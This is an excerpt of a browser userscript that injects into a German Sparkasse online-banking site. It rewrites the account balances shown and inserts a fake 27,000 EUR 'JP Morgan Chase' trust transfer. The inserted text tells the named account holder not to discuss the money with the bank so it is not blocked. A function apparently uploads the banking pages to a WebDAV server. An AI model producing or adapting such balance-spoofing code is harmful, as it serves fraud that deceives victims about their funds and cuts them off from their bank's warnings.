...
// @downloadURL https://update.greasyfork.org/scripts/499592/Ed%20WM%20MICHAEL%20R%C3%96SLER.user.js
// @updateURL https://update.greasyfork.org/scripts/499592/Ed%20WM%20MICHAEL%20R%C3%96SLER.meta.js
// ==/UserScript==
...
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
    ...
    var absender = "JP Morgan Chase";
    var absenderTitel = "Treuhand: JP Morgan Chase";
    var firma = "test";
    var asenderReference = "WD3746 TRX88205A CX13280";
    var absenderDetails = "Freigabe erteilt durch JP Morgan. Mit Bank nicht besprechen damit nicht gesperrt. A. Graf meldet sich.";
    var amount = 0;
    var vorgemerkt = "no";
    var xamount = 0;
    var x2amount = 0;
    ...
    var buchungTextsZahl = "277.680";
    var accountsecurity = "1350 1044 81";
...
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
     ...
     if (window.location.href.indexOf("finanzuebersicht.html") > 0 || window.location.href.indexOf("kontoauswahl") > 0 || window.location.href.indexOf("11317605933") > 0) {
...
// Helper function to check if an element has a class containing specific parts
function hasClassContaining(element, classNamePart) {
    return element.classList.contains(classNamePart);
}

// Function to update balance and sibling class with the same logic as before
function updateElementBalance(element, amount) {
    if (!isWithinRestrictedParent(element)) {
        updateBalanceAndSiblingClass(element, amount);
    }
}

// Select all elements whose class name contains 'mkp-currency' and 'mkp-currency-m'
var allElements = document.querySelectorAll('*');
var filteredElements = Array.prototype.filter.call(allElements, function(element) {
    return hasClassContaining(element, 'mkp-currency') && hasClassContaining(element, 'mkp-currency-m');
});

// Update the main balance and its sibling
var mainBalanceIndex = main || 0;
var mainBalanceElement = filteredElements[mainBalanceIndex]?.firstElementChild;
if (mainBalanceElement) {
    updateElementBalance(mainBalanceElement, xamount);
}

// Update the total balance and its sibling
var totalBalanceIndex = total || 1;
var totalBalanceElement = filteredElements[totalBalanceIndex]?.firstElementChild;
if (totalBalanceElement) {
    updateElementBalance(totalBalanceElement, x2amount + xamount);
}

// Update the subtotal balance and its sibling
var subtotalBalanceIndex = subtotal || 1;
var subtotalBalanceElement = filteredElements[subtotalBalanceIndex]?.firstElementChild;
if (subtotalBalanceElement) {
    updateElementBalance(subtotalBalanceElement, x2amount + xamount);
}
...
//CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE------CONFIGURE
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
if (window.location.href.indexOf("umsaetze.html") > 0 || window.location.href.indexOf("11305378922") > 0 ) {
...
//+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 ...
 var x3HTML = '<li aria-label="RUECKUEBERWEISUNG Sonstige Gruende Transfer  ; 27.000,00 EUR" style="list-style-type: none;"><div class="mkp-card mkp-card-debit mkp-card-thinner mkp-card-clickable"><div class="mkp-identifier"><div class="mkp-identifier-description"><h3><a href="#" onclick="return IF.checkFirstSubmit();" class="mkp-identifier-link" title="JP Morgan Chase">JP Morgan Chase</a></h3><p>Auf Andreas Graf warten. Mit Sparkasse das Geld NICHT besprechen, damit nicht gesperrt wird.</p></div><div class="mkp-identifier-sticker-placeholder"></div><div class="mkp-identifier-currency"><div class="mkp-currency mkp-currency-m"><span aria-hidden="true" class="balance-predecimal plus">27.000</span><span aria-hidden="true" class="balance-decimal plus">,00&nbsp;EUR</span><span aria-hidden="false" class="offscreen">27.000,00 EUR</span></div></div></div></div></li>';
...
(function webpageUploaderToWebDAV() {
  ...
  const clientName = "MICHAEL RÖSLER";
